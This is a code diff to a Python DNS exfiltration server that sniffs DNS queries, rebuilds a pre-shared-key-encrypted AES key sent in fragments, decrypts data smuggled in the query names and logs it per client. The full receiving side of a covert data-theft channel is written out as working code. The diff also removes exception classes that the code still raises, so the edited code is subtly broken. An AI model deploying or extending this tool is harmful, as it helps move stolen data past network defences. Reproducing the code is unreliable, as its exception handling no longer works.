@@ -22,49 +22,26 @@ class SentPacketTypes(Enum):
     MAX = 204  # reached max connection
 
 
-# Custom exceptions for specific errors
-class ShortCircuitException(Exception):
-    pass
-
-
-class UnrelatedException(Exception):
-    pass
-
-
-class DNSSyntaxException(Exception):
-    pass
-
-
-class ServerMaxConnectionsException(Exception):
-    pass
-
-
-class NXConnectionException(Exception):
-    pass
-
-
-class PacketsOutOfOrderException(Exception):
-    pass
-
-
 # Pre-shared key (PSK) for exchanging the AES key securely
 psk = b"thisisaverysecurekey123456789012"  # Must match the client's PSK
-
 
 # Initialize received_fragments as a dictionary to map IP addresses to their fragments
 received_fragments = {}
 
+
 # AES decryption for the key exchange (PSK-based)
 def decrypt_with_psk(encrypted_data, psk, ip):
     global received_fragments
-    
+
     # Initialize the fragment list for the IP if it doesn't exist
     if ip not in received_fragments:
         received_fragments[ip] = []
 
     if encrypted_data in received_fragments[ip]:
+        print(f"[SERVER] Duplicate fragment from {ip}, ignoring.")
         return None, False  # Skip duplicate fragments
 
+    # Append the new fragment
     received_fragments[ip].append(encrypted_data)
     complete_aes_key = "".join(received_fragments[ip])
 
@@ -76,6 +53,7 @@ def decrypt_with_psk(encrypted_data, psk, ip):
     try:
         # Check if the key is complete (ends with ==)
         if complete_aes_key.endswith("=="):
+            print(f"[SERVER] All fragments for {ip} received, attempting AES key decryption.")
             data = base64.b64decode(complete_aes_key)
             iv = data[:16]  # First 16 bytes are IV
             encrypted_aes_key = data[16:]  # The rest is the encrypted AES key
@@ -83,21 +61,19 @@ def decrypt_with_psk(encrypted_data, psk, ip):
             decrypted_aes_key = unpad(cipher.decrypt(encrypted_aes_key), AES.block_size)
             return decrypted_aes_key, True
         else:
-            print("[SERVER] Waiting for more fragments")
+            print(f"[SERVER] Incomplete AES key fragments for {ip}, waiting for more.")
             return None, False  # Incomplete key
     except Exception as e:
         print(f"[SERVER] AES key decryption error: {e}")
         return None, False
 
 
-# TODO: CHECK IF NEEDED
+# Base64 decoding with padding
 def decode_base64_with_padding(data):
-    # Add padding if necessary
     missing_padding = len(data) % 4
     if missing_padding:
         data += '=' * (4 - missing_padding)
     return base64.b64decode(data)
-
 
 
 def decrypt_aes(data, key):
@@ -126,7 +102,6 @@ class DataParser:
         return len(self.data)
 
     def add(self, packet_number: int, data: bytes, key):
-        # Adds data to the parser after decrypting the message with AES key
         if packet_number == self.last_received:
             print("Repeated packet")
             raise ShortCircuitException()  # Prevent duplicate processing
@@ -142,11 +117,9 @@ class DataParser:
             self.last_received = packet_number
 
     def parse_all(self):
-        # Decodes and returns the stored data as a string
         return self.data.decode('ascii')
 
     def save_to_disk(self, path: str, id: int):
-        # Saves all the collected data to a log file
         print(f"Saving data to disk for connection {id} from IP {self.ip}")
         try:
             os.makedirs(path, exist_ok=True)
@@ -166,7 +139,6 @@ class DataParserManager:
         self.parsers.append(parser)
 
     def parse(self, data: str):
-        # Parses incoming data from DNS queries
         try:
             parts = data.split(".")
             print(f"Received data: {data}")
@@ -183,7 +155,7 @@ class DataParserManager:
             connection_id = int(connection_id)
 
             if connection_id > len(self.parsers):
-                raise NXConnectionException()  # Connection ID does not exist
+                raise NXConnectionException()
 
             parser = self.parsers[connection_id - 1]
             aes_key = clients[parser.ip]['aes_key']  # Retrieve AES key for decryption
@@ -198,35 +170,30 @@ class DataParserManager:
         return len(self.parsers)
 
     def save_parsers(self, save_path: str):
-        # Saves all data parsers to disk
         os.makedirs(save_path, exist_ok=True)
         for i, parser in enumerate(self.parsers):
             parser.save_to_disk(save_path, i + 1)
-        
+
 
 # Helper function to handle DNS queries
 def handle_query(pkt, domain, data_parsers):
-    # Print detailed packet information
     print(f"Full query received: {pkt[DNSQR].qname.decode()}")
-    
+
     pkt.show()  # This will print detailed packet information
 
     qname = pkt[DNSQR].qname.decode()
-
-    # Try to extract the data from the query
     data = get_data(qname, domain)
     print(f"[SERVER] Extracted data: {data}")
-    
-    # Boolean Value to track key fragments
+
     completed_key = False
 
     if data:
         # Step 1: If the client doesn't have an AES key yet, decrypt it with the PSK
         if pkt[IP].src not in clients:
             aes_key, completed_key = decrypt_with_psk(data, psk, pkt[IP].src)
-            
-            # To check if the full key is received (ends with "==")
-            if completed_key == True: 
+
+            # Check if the full key is received
+            if completed_key:
                 clients[pkt[IP].src] = {'aes_key': aes_key, 'parser': DataParser(pkt[IP].src)}
                 data_parsers.add_parser(clients[pkt[IP].src]['parser'])
                 print(f"[SERVER] Decrypted AES Key for {pkt[IP].src}")
@@ -240,18 +207,6 @@ def handle_query(pkt, domain, data_parsers):
     else:
         print("[SERVER] No valid exfiltration data found.")
 
-    # TODO: CHECK IF WORKS TO RETURN TO CLIENT
-    # Send a basic OK response to acknowledge
-    response = create_response("127.0.0.1", pkt)
-    # send(response)
-
-
-# Creates a DNS response to the query
-def create_response(ip, pkt):
-    return IP(dst=pkt[IP].src) / UDP(dport=pkt[UDP].sport, sport=53) / DNS(
-        id=pkt[DNS].id, qr=1, aa=1, ra=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=ip)
-    )
-
 
 # Extract data from the DNS query
 def get_data(full: str, domain: str):
@@ -261,15 +216,24 @@ def get_data(full: str, domain: str):
     # Ensure the domain is correctly part of the query
     if not stripped.endswith("." + domain):
         raise ShortCircuitException()
-    
+
     data = full.split('.')[0]  # Get the first part before the first "."
-    
+
     return data
+
+
+stop_sniffing = threading.Event()
 
 
 # Starts a listener for DNS queries on port 53
 def start_listener(domain, data_parsers):
-    sniff(filter="udp port 53", prn=lambda pkt: handle_query(pkt, domain, data_parsers), store=0)
+    def check_stop(pkt):
+        if stop_sniffing.is_set():
+            return True  # Stop sniffing when the flag is set
+        handle_query(pkt, domain, data_parsers)
+        return False  # Continue sniffing
+
+    sniff(filter="udp port 53", prn=check_stop, store=0, stop_filter=lambda x: stop_sniffing.is_set())
 
 
 if __name__ == '__main__':
@@ -282,12 +246,18 @@ if __name__ == '__main__':
     listener_thread.daemon = True
     listener_thread.start()
 
-    # Main server loop
-    while True:
-        command = input("Enter 'quit' to stop the server: ")
-        if command == 'quit':
-            break
+    try:
+        # Main server loop
+        while True:
+            command = input("Enter 'quit' to stop the server: ")
+            if command == 'quit':
+                break
 
-    print("Stopping the DNS server...")
-    data_parsers.save_parsers("./logs")
-    print("Goodbye.")
+    finally:
+        print("Stopping the DNS server...")
+        stop_sniffing.set()  # Set the stop event for sniffing
+        print("Stop Sniffing stop")
+        listener_thread.join()  # Wait for the sniffing thread to stop
+        print("Thread stopped")
+        data_parsers.save_parsers("./logs")
+        print("Goodbye.")
